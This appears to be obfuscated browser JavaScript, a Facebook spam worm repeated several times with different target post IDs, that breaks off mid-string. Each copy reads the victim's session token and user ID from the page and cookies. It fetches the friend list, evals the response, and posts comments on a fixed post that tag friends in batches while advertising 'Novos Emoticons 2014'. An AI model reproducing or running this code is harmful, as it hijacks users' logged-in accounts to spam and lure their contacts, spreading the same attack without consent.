_0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","413758318767977","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","399162470227562","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","414030905407385","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","485813548184768","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","681278585261928","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","432557003555937","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  